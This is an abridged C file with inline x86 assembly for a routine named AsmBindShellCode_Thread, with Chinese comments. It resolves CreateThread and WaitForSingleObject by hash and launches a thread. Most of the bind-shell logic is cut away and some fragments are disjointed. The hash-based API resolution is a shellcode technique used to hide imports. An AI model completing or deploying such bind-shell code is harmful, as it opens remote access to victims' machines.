...
void __declspec(naked) AsmBindShellCode_Thread()
{
	__asm
	{
		push ebp
		pushad
		mov ebp, esp
		sub esp, 0x10 // 分配参数空间 4个字节  先同时提升ebp和esp的空间 
		...
		*/
		...
		// 获取 CreateThread 2729F8BB 函数地址 
		push 0x2729F8BB
		push [ebp - 0x4]
		call func_GetProcAddress
		mov [ebp - 0x8], eax

		// 获取 WaitForSingleObject 2216AFCA 函数地址
		push 0x2216AFCA
		push [ebp - 0x4]
		call func_GetProcAddress
		mov [ebp - 0x0C], eax
		...
		push 0
		push 0
		//lea ebx, func_thread_callback
		push func_thread_callback  // 函数指针
		push 0
		push 0
		call [ebp - 0x8]
	...
	func_thread_callback:
		...
		-4c 存放 WaitForSingleObject 函数地址
		-48 存放 CreateThread 函数地址
...
{
	printf("helloworld\n");
	AsmBindShellCode_Thread();
	printf("input enter exit program\n");
	getchar();
	return 0;
}